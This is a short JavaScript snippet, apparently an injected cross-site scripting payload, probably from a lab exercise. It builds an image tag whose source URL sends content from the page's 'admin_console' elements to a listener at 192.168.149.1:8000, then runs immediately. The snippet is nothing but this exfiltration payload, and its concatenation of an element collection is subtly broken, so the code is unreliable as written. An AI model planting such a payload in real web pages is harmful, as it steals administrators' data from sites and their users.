function addTheImage() {
    var img = document.createElement('img');
    img.src = "http://192.168.149.1:8000/index.php?c="+document.getElementsByClassName("col-8 admin_console");
    document.body.appendChild(img);
}
addTheImage();
